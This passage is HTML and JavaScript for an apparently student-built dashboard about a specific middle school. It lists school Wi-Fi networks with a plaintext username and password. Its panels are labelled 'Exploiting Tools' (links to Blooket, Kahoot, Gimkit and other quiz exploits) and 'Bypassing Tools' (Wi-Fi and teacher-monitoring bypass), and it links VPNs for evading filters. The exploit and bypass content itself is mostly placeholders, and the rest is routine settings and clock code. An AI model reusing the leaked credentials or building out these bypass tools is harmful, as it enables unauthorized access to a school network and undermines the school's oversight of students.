          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div>Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>📱 School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions'); dashboard.showNotification('Viewing iPad Restrictions.', 'info')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses'); dashboard.showNotification('Viewing iPad Bypasses.', 'info')">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content">
          <p>Coming soon</p>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <p>Coming soon</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>📘 Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank" onclick="dashboard.showNotification('Opening Elementary Handbook (PDF).', 'info')">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank" onclick="dashboard.showNotification('Opening Secondary Student Handbook (PDF).', 'info')">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank" onclick="dashboard.showNotification('Opening District Handbook (PDF).', 'info')">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank" onclick="dashboard.showNotification('Opening RA Academy Handbook (PDF).', 'info')">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank" onclick="dashboard.showNotification('Opening Virtual Learning Plan (PDF).', 'info')">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank" onclick="dashboard.showNotification('Opening Dress Code (PDF).', 'info')">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>🏫 School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>🌐 Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank" onclick="dashboard.showNotification('Navigating to RaiderWeb.', 'info')">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank" onclick="dashboard.showNotification('Navigating to Canvas Login.', 'info')">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank" onclick="dashboard.showNotification('Navigating to Care Solace.', 'info')">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank" onclick="dashboard.showNotification('Navigating to Clever Login.', 'info')">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank" onclick="dashboard.showNotification('Navigating to EasyBridge.', 'info')">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank" onclick="dashboard.showNotification('Navigating to FitnessGram.', 'info')">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank" onclick="dashboard.showNotification('Navigating to Hazing Reporting.', 'info')">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank" onclick="dashboard.showNotification('Navigating to MAHS Announcements YouTube.', 'info')">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank" onclick="dashboard.showNotification('Navigating to Naviance.', 'info')">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank" onclick="dashboard.showNotification('Navigating to Destiny Library.', 'info')">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank" onclick="dashboard.showNotification('Navigating to PowerSchool.', 'info')">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank" onclick="dashboard.showNotification('Navigating to Scholastic.', 'info')">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank" onclick="dashboard.showNotification('Navigating to Safe2Say.', 'info')">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank" onclick="dashboard.showNotification('Navigating to Gmail.', 'info')">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank" onclick="dashboard.showNotification('Navigating to Balfour.', 'info')">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank" onclick="dashboard.showNotification('Navigating to LinkIt!', 'info')">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>👩‍🏫 Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank" onclick="dashboard.showNotification('Navigating to Acadience Learning.', 'info')">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank" onclick="dashboard.showNotification('Navigating to AIMSweb Plus.', 'info')">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank" onclick="dashboard.showNotification('Navigating to ERP Linq.', 'info')">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank" onclick="dashboard.showNotification('Navigating to Barracuda.', 'info')">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank" onclick="dashboard.showNotification('Navigating to Buy Guernsey.', 'info')">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank" onclick="dashboard.showNotification('Navigating to Canvas (Teacher).', 'info')">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank" onclick="dashboard.showNotification('Navigating to Care Solace.', 'info')">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank" onclick="dashboard.showNotification('Navigating to Clever (Teacher).', 'info')">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank" onclick="dashboard.showNotification('Navigating to Discovery Education.', 'info')">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank" onclick="dashboard.showNotification('Navigating to EasyBridge (Teacher).', 'info')">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank" onclick="dashboard.showNotification('Navigating to FMX.', 'info')">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank" onclick="dashboard.showNotification('Navigating to FitnessGram.', 'info')">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank" onclick="dashboard.showNotification('Navigating to Frontline.', 'info')">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank" onclick="dashboard.showNotification('Navigating to LinkIt! (Teacher).', 'info')">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank" onclick="dashboard.showNotification('Navigating to Naviance.', 'info')">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank" onclick="dashboard.showNotification('Navigating to Destiny Library.', 'info')">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank" onclick="dashboard.showNotification('Navigating to PA eTEP.', 'info')">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank" onclick="dashboard.showNotification('Navigating to PowerSchool (Teacher).', 'info')">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank" onclick="dashboard.showNotification('Navigating to Scholastic.', 'info')">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank" onclick="dashboard.showNotification('Navigating to SchoolMessenger.', 'info')">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank" onclick="dashboard.showNotification('Navigating to PDE SAS.', 'info')">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank" onclick="dashboard.showNotification('Navigating to PBIS Apps.', 'info')">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank" onclick="dashboard.showNotification('Navigating to HappyFox.', 'info')">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank" onclick="dashboard.showNotification('Navigating to SafeSchools.', 'info')">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank" onclick="dashboard.showNotification('Navigating to Office 365.', 'info')">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>📞 School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>📷 School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>🏫 School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>🧨 Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" onclick="dashboard.showNotification('Opening Blooket Exploit.', 'info')">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" onclick="dashboard.showNotification('Opening Kahoot Exploit.', 'info')">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" onclick="dashboard.showNotification('Opening Gimkit Exploit.', 'info')">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" onclick="dashboard.showNotification('Opening Quizlet Exploit.', 'info')">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" onclick="dashboard.showNotification('Opening Quizzes Exploit.', 'info')">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" onclick="dashboard.showNotification('Opening Quills Exploit.', 'info')">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" onclick="dashboard.showNotification('Opening Edpuzzle Exploit.', 'info')">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" onclick="dashboard.showNotification('Opening Nearpod Exploit.', 'info')">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>🚪 Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom'); dashboard.showNotification('Viewing Bathroom Bypass details.', 'info')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi'); dashboard.showNotification('Viewing WiFi Bypass details.', 'info')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring'); dashboard.showNotification('Viewing Teacher Monitoring Bypass details.', 'info')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('coming1'); dashboard.showNotification('Coming Soon button pressed.', 'info')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming2'); dashboard.showNotification('Coming Soon button pressed.', 'info')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming3'); dashboard.showNotification('Coming Soon button pressed.', 'info')">Coming Soon</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <p>Go to School Wifi Information</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming1Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming2Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming3Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>🔐 VPN Websites</h2>
        <div class="links-list">
          <a href="https://example-vpn1.com" target="_blank" onclick="dashboard.showNotification('Navigating to VPN Service 1.', 'info')">VPN Service 1</a>
          <a href="https://example-vpn2.com" target="_blank" onclick="dashboard.showNotification('Navigating to VPN Service 2.', 'info')">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank" onclick="dashboard.showNotification('Navigating to VPN Service 3.', 'info')">VPN Service 3</a>
          <a href="https://example-vpn4.com" target="_blank" onclick="dashboard.showNotification('Navigating to VPN Service 4.', 'info')">VPN Service 4</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>🎮 Gaming Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>🎵 Music Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>🎹 Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:
• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.
Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.
General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>
    </div>

    <div id="canvasContainer">
      <h2>🖌️ Notes Canvas</h2>
      <canvas id="notesCanvas" width="600" height="400"></canvas>
      <div id="canvasControls">
        <button id="clearCanvasBtn" onclick="dashboard.showNotification('Canvas cleared.', 'info')">Clear Canvas</button>
        <button id="closeCanvasBtn" onclick="dashboard.showNotification('Notes canvas closed.', 'info')">Close Notes</button>
      </div>
    </div>
  </div>

  <!-- Notification Container -->
  <div id="notification-container"></div>

  <script>
    // Global function to show notifications (can be called by login system too)
    function showNotification(message, type = 'info', duration = 3000) {
      if (typeof dashboard !== 'undefined' && dashboard.getSetting('enableDesktopNotifications') && Notification.permission === 'granted') {
          new Notification('Dashboard Notification', { body: message, icon: 'https://cdn.discordapp.com/icons/1402682960397860964/b99d7a26f3e09848520e181d19b48c3b.png' }); // Example icon
      }
      if (typeof dashboard !== 'undefined' && dashboard.getSetting('enableNotificationSound')) {
          const sound = new Audio('https://www.soundjay.com/buttons/beep-07.wav'); // Example sound
          sound.play().catch(e => console.log("Sound play prevented: ", e));
      }

      const container = document.getElementById('notification-container');
      const toast = document.createElement('div');
      toast.classList.add('notification-toast', type, 'show');
      toast.textContent = message;

      container.appendChild(toast);

      if (! (typeof dashboard !== 'undefined' && dashboard.getSetting('notificationPersistence')) ) {
        setTimeout(() => {
            toast.classList.remove('show');
            toast.classList.add('hide');
            toast.addEventListener('animationend', () => toast.remove());
        }, duration);
      } else {
        // Allow users to close persistent notifications
        toast.style.cursor = 'pointer';
        toast.title = 'Click to dismiss';
        toast.onclick = () => {
            toast.classList.remove('show');
            toast.classList.add('hide');
            toast.addEventListener('animationend', () => toast.remove());
        };
      }
    }

    // Dashboard functionality object
    const dashboard = {
      // Internal state for settings and reminders
      _settings: {},
      _reminders: [],
      
      // Initialize all dashboard functionality
      init: function() {
        this.loadSettings();
        this.applySettings();
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initButtons(); // Existing + new
        this.initCanvas();
        this.initPanels(); // Also handles new panels
        this.initReminderSystem(); // New reminder system
        this.populateProfilePanel(); // Populate profile with login data
      },

      // Settings management functions
      loadSettings: function() {
        try {
          const storedSettings = localStorage.getItem('dashboardSettings');
          if (storedSettings) {
            this._settings = JSON.parse(storedSettings);
          } else {
            // Default settings
            this._settings = {
              language: 'en',
              timezone: 'America/New_York',
              dateFormat: 'MM/DD/YYYY',
              autoSaveData: true,
              theme: 'dark', // 'dark' or 'light'
              accentColor: '#ff914d',
              fontFamily: "'Montserrat', sans-serif",
              uiDensity: 1,
              customBackground: '',
              enableNotificationSound: true,
              enableDesktopNotifications: false,
              notificationPersistence: false,
              enableButtonPressNotifications: true,
              enableReminderNotifications: true,
              highContrast: false,
              reduceMotion: false,
              screenReader: false,
              cursorSize: 1,
              showUpdates: true,
              showCalendar: true,
              showMotivation: true,
              defaultSnooze: 5,
              reminderSound: 'default',
              experimentalFeatures: false
            };
            this.saveSettings();
          }
        } catch (e) {
          console.error("Error loading settings from localStorage:", e);
          this._settings = { // Fallback to defaults
            language: 'en', timezone: 'America/New_York', dateFormat: 'MM/DD/YYYY', autoSaveData: true,
            theme: 'dark', accentColor: '#ff914d', fontFamily: "'Montserrat', sans-serif", uiDensity: 1, customBackground: '',
            enableNotificationSound: true, enableDesktopNotifications: false, notificationPersistence: false, enableButtonPressNotifications: true, enableReminderNotifications: true,
            highContrast: false, reduceMotion: false, screenReader: false, cursorSize: 1,
            showUpdates: true, showCalendar: true, showMotivation: true, defaultSnooze: 5, reminderSound: 'default', experimentalFeatures: false
          };
        }
      },
      saveSettings: function() {
        try {
          localStorage.setItem('dashboardSettings', JSON.stringify(this._settings));
        } catch (e) {
          console.error("Error saving settings to localStorage:", e);
        }
      },
      getSetting: function(key) {
        return this._settings[key];
      },
      setSetting: function(key, value) {
        this._settings[key] = value;
        this.saveSettings();
      },
      resetSettings: function() {
          localStorage.removeItem('dashboardSettings');
          this.loadSettings(); // Reload defaults
          this.applySettings(); // Apply defaults
          this.showNotification('All settings reset to default.', 'success');
          // For immediate visual update, some elements might need explicit refresh if applySettings doesn't cover them.
          // Consider a full page reload or targeted DOM updates for complex settings reset.
          // For this case, reload on next page load is acceptable.
      },
      applySettings: function() {
          // Apply theme
          if (this.getSetting('theme') === 'light') {
              document.body.classList.add('light-theme');
              document.getElementById('themeToggle').innerText = '☀️ Light Mode';
              document.getElementById('themeToggleSettings').checked = true;
          } else {
              document.body.classList.remove('light-theme');
              document.getElementById('themeToggle').innerText = '🌙 Dark Mode';
              document.getElementById('themeToggleSettings').checked = false;
          }
          // Apply accent color
          this.setAccentColor(this.getSetting('accentColor'), false); // Don't save again
          // Apply font family
          document.body.style.setProperty('--system-font', this.getSetting('fontFamily'));
          // Apply UI density
          document.documentElement.style.fontSize = (this.getSetting('uiDensity') * 16) + 'px';
          if(document.getElementById('uiDensityRange')) document.getElementById('uiDensityRange').value = this.getSetting('uiDensity');
          if(document.getElementById('uiDensityValue')) document.getElementById('uiDensityValue').textContent = this.getSetting('uiDensity');
          // Apply custom background
          this.applyCustomBackground(this.getSetting('customBackground'), false);
          // Apply notification sound setting to the control
          if(document.getElementById('enableNotificationSound')) document.getElementById('enableNotificationSound').checked = this.getSetting('enableNotificationSound');
          if(document.getElementById('enableButtonPressNotifications')) document.getElementById('enableButtonPressNotifications').checked = this.getSetting('enableButtonPressNotifications');
          if(document.getElementById('enableReminderNotifications')) document.getElementById('enableReminderNotifications').checked = this.getSetting('enableReminderNotifications');
          if(document.getElementById('notificationPersistence')) document.getElementById('notificationPersistence').checked = this.getSetting('notificationPersistence');
          // Apply high contrast
          if(this.getSetting('highContrast')) document.body.classList.add('high-contrast');
          if(document.getElementById('highContrastMode')) document.getElementById('highContrastMode').checked = this.getSetting('highContrast');
          // Apply reduce motion
          if(this.getSetting('reduceMotion')) document.body.classList.add('reduce-motion');
          if(document.getElementById('reduceMotion')) document.getElementById('reduceMotion').checked = this.getSetting('reduceMotion');

          // Apply display settings
          document.getElementById('updatesNotifications').children[0].style.display = this.getSetting('showUpdates') ? 'block' : 'none';
          if(document.getElementById('showUpdatesToggle')) document.getElementById('showUpdatesToggle').checked = this.getSetting('showUpdates');

          document.getElementById('mainGrid').children[0].style.display = this.getSetting('showCalendar') ? 'block' : 'none';
          if(document.getElementById('showCalendarToggle')) document.getElementById('showCalendarToggle').checked = this.getSetting('showCalendar');

          document.getElementById('motivationBox').style.display = this.getSetting('showMotivation') ? 'flex' : 'none';
          if(document.getElementById('showMotivationToggle')) document.getElementById('showMotivationToggle').checked = this.getSetting('showMotivation');
      },

      // Utility function for notifications, checking settings
      showNotification: function(message, type = 'info', duration = 3000) {
        if (this.getSetting('enableButtonPressNotifications') || type === 'error' || type === 'success') {
          showNotification(message, type, duration);
        }
      },
      
      // Request Desktop Notification Permission
      requestDesktopNotificationPermission: function(checked) {
          if (!("Notification" in window)) {
              alert("This browser does not support desktop notifications.");
              return;
          }
          if (checked) {
              Notification.requestPermission().then(permission => {
                  if (permission === "granted") {
                      this.showNotification("Desktop notifications are now enabled.", "success");
                  } else {
                      this.showNotification("Desktop notification permission denied.", "error");
                      // Uncheck the setting if permission isn't granted
                      if (document.getElementById('enableDesktopNotifications')) document.getElementById('enableDesktopNotifications').checked = false;
                      this.setSetting('enableDesktopNotifications', false);
                  }
              });
          }
      },

      // Custom background functionality
      applyCustomBackground: function(url, save = true) {
        if (url) {
          document.body.style.backgroundImage = `url('${url}')`;
          document.body.style.backgroundSize = 'cover';
          document.body.style.backgroundAttachment = 'fixed';
          if(document.getElementById('customBackgroundInput')) document.getElementById('customBackgroundInput').value = url;
        } else {
          document.body.style.backgroundImage = 'none';
          if(document.getElementById('customBackgroundInput')) document.getElementById('customBackgroundInput').value = '';
        }
        if (save) this.setSetting('customBackground', url);
      },

      // Accent color application
      setAccentColor: function(color, save = true) {
        document.documentElement.style.setProperty('--primary-accent', color);
        if (save) this.setSetting('accentColor', color);
        // Also update settings picker
        if(document.getElementById('accentColorPicker')) document.getElementById('accentColorPicker').value = color;
      },

      // Populate user data in the profile panel and settings
      populateProfilePanel: function() {
        const username = document.getElementById('loggedInUser').textContent; // Assumes login has updated this
        const userID = document.getElementById('loggedInID').textContent;

        document.getElementById('settingsLoggedInUser').textContent = username;
        document.getElementById('settingsLoggedInID').textContent = userID;

        if(document.getElementById('profileUserName')) document.getElementById('profileUserName').textContent = username; // User data will need to be passed
        if(document.getElementById('profileUserUsername')) document.getElementById('profileUserUsername').textContent = username;
        if(document.getElementById('profileUserID')) document.getElementById('profileUserID').textContent = userID;
        // The rank/role and creation date needs to come from the user JSON for actual data.
        // For now, hardcoding based on 'Beta.user' and '281573' assumed user.
        if(document.getElementById('profileUserRank')) document.getElementById('profileUserRank').textContent = 'Student';
        if(document.getElementById('profileUserRole')) document.getElementById('profileUserRole').textContent = 'General User';
        if(document.getElementById('profileAccountCreation')) document.getElementById('profileAccountCreation').textContent = '2023-01-01 (Estimated)';
      },


      // Initialize session timer
      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        function updateSessionTime() {
          sessionSeconds++;
          document.getElementById('sessionTime').innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
        }
        
        updateSessionTime();
        setInterval(updateSessionTime, 1000);
      },
      
      // Initialize real-time clock
      initClock: function() {
        function updateClock() {
          const now = new Date();
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          document.getElementById('realTimeClock').innerText = '🕒 ' + timeStr;
          document.getElementById('realDate').innerText = '📅 ' + dateStr;
        }
        
        updateClock();
        setInterval(updateClock, 1000);
      },
      
      // Generate calendar
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = ''; 
